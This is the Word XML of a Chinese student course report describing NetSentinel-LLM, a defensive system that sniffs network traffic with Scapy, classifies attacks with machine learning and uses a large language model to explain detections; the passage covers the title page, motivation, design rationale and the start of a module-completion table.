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DFCA4"/>
    <w:p w14:paraId="2C3D6FBE">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>天津理工大学华信软件学院</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BAD6C2">
      <w:pPr>
        <w:spacing w:after="360"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="44"/>
        </w:rPr>
        <w:t>2024 级计算机网络技术课程答辩报告</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3811A67B">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:color="000000" w:sz="8" w:space="1"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37AC3B6C"/>
    <w:p w14:paraId="6509A328">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>题目：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716A6A93">
      <w:pPr>
        <w:spacing w:after="40" w:line="312" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>基于 Scapy 与机器学习的智能网络流量嗅探分析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696FCE0F">
      <w:pPr>
        <w:spacing w:after="40" w:line="312" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>及大语言模型诊断系统</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CB8CCB">
      <w:pPr>
        <w:spacing w:after="400"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>（NetSentinel-LLM）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E869CC"/>
    <w:p w14:paraId="48B3702C">
      <w:pPr>
        <w:spacing w:after="80" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>组　　长：姚霖锋</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE6C179">
      <w:pPr>
        <w:spacing w:after="80" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>组　　员：孙贤泽　　潘凤乐　　王储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E851563">
      <w:pPr>
        <w:spacing w:after="80" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>班　　级：＿＿</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:ascii="宋体" w:hAnsi="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>＿＿＿＿＿＿</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE30206">
      <w:pPr>
        <w:spacing w:after="80" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>指导教师：＿＿＿</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:ascii="宋体" w:hAnsi="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>魏立华</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>＿＿＿＿＿</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B448ED4">
      <w:pPr>
        <w:spacing w:before="560"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:eastAsia="宋体"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2026 年 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:ascii="宋体" w:hAnsi="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 月</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:ascii="宋体" w:hAnsi="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:ascii="宋体" w:hAnsi="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>日</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E168D3B">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F88BE6">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="360" w:after="200" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>一、课题综述</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391DE817">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1.1 问题的提出</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67443B3B">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>网络嗅探是计算机网络课程里最直观的一类实验：把网卡置为混杂模式，抓取经过的每一个以太网帧，再逐层解封装到 IP 首部与 TCP/UDP 首部，就能看见网络里到底在传什么。tcpdump 与 Wireshark 把这件工作做到了极致，但它们有一个共同前提——判断由人来做。一段几万个包的抓包文件，初学者靠肉眼找出端口扫描或洪水攻击，实际上做不到；即便找到了，也说不清这条流为什么异常、依据是哪个字段、下一步该封哪个方向。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE4BF05">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>另一方面，课程里讲到的防火墙与入侵检测系统（Snort、Suricata）解决的是“自动报警”，但报警的输出形态是一行规则名加一个五元组。它回答“命中了哪条规则”，不回答“这条流是什么、为什么可疑、该怎么处置”。规则还要人工维护，而现实中的协议种类与攻击变体远多于任何一份规则集。本课题想验证的问题是：能不能在“看见”（嗅探）之外，把“判断”和“解释”两步也自动化，拼成一条从原始以太网帧到中文处置建议的完整链路。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FDC09E">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1.2 现有方案的不足</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D0B492">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第一类是陈列式。Wireshark 的强项是把协议字段结构化地摊开给人看，它的价值在“可核查”，不在“可判断”。本项目的做法不是取代它，而是把它的输出当作下游的证据来源——我们同时保留 pcap 与会话特征 CSV，任何一条告警都能回到 Wireshark 里逐帧核对。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329A2B2A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第二类是规则式。规则判据是确定性的、可解释的，但覆盖面受规则集限制。更关键的是，同一条规则在不同采集口径下的数值含义可能完全不同：数据集里“单包流”的包长统计只有 0、2、6 三种取值，因为那是 L4 载荷字节；我们改前按 IP 总长统计，一个 40 字节的纯 SYN 就被记成 40。规则写得越精细，这种口径错配造成的静默误差越大。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABE3FC0">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第三类是封闭式。商用流量分析产品给出一个风险分数，用户拿不到分数是怎么来的，也无法追问“如果是内网主机被攻陷发起的，处置顺序有什么不同”。大语言模型的出现让这一步第一次有可能被自动化：把结构化证据交给它，用固定 schema 约束它的输出，它就能按协议机制写出一份可读的中文报告。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A507ED">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1.3 本课题的技术路线</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEEC907">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>我们把任务拆成四步，对应智能体的“感知—思考—行动—反馈”闭环：感知是把原始以太网帧解析成双向会话并按 CICFlowMeter 口径汇总成 78 维特征向量；思考是机器学习模型给出类别与置信度；行动是规则引擎兜底、大语言模型生成诊断报告；反馈是看板实时展示、支持追问、可导出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52336F48">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>系统按这四个动作分成四层：边缘层（两台 PC 探针，抓包与特征）、中心层（云服务器上的 FastAPI 服务，鉴权、存储、推理、告警）、大模型层（DeepSeek 主用、通义千问备用）、展示层（Streamlit 看板）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9DAE75">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这里有一个主动做出的设计判断需要说明：我们**没有**把整件事交给一个大模型。原因有三条。其一是速度与成本：2 秒一个窗口的实时判断如果每次都调用大模型，单条流的判定延迟从毫秒级变成秒级，调用次数还与流量成正比。其二是可复现：分类器加载的是持久化的模型文件，同一输入必得同一输出；大模型带温度采样，同一输入两次结果不完全一致，不能当分类器用。其三是幻觉：让大模型直接“看包”判断攻击，它会把“典型 SYN Flood 的表现”当成“本次流量的表现”来写，报告读起来很专业但内容是编的。所以分工是——小模型负责判断并给出证据，大模型只在这个结论之上做解释与处置建议，并且被提示词明确禁止改判、禁止引用未给定的证据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB4A6B1">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>另一条判断是：协议类型不交给机器学习。TCP/UDP/ICMP 由 IP 首部的 protocol 字段直接确定，是确定性事实，用规则解析即可；机器学习只用在“载荷加密、规则难以穷尽”的统计行为层面，例如端口扫描、洪水攻击、暴力破解。这条写在 3.3 节。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BCAB37">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1.4 完成情况一览</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7150BE87">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>项目共划分 11 个模块，当前完成 10 个，1 个未完成（M10 双探针联动演示）。代码 5 677 行（不含文档与本报告生成脚本），单元测试 59 条全部通过。按验收口径逐项对照见下表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729D7CF2">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 1-1　模块完成情况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2608"/>
        <w:gridCol w:w="907"/>
        <w:gridCol w:w="1020"/>
        <w:gridCol w:w="3288"/>
      </w:tblGrid>
      <w:tr w14:paraId="3D429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794" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="13DFC7C9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>模块</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="123ADF93">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>名称</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="04CEF68E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1020" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2A863351">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>负责人</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4AF193BA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>说明</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="1F21E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3C30C368">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="24529C15">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>数据包嗅探与协议解析</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="07AE05C4">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39F47CFE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>姚霖锋</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67CC4B20">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>scapy 抓包、双向会话表、pcap 落盘</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="494C6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7543CB5A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="10C819FA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>流量特征工程</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5D7E9B7C">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30E08533">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>孙贤泽</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3288" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="27716940">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>78 维 CICFlowMeter 口径特征，与数据集口径对齐</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="4436E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75B22077">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>M3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="212887C0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>小模型攻击检测</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="907" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="00C8FF4A">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3A6D8BBE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>孙贤泽</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
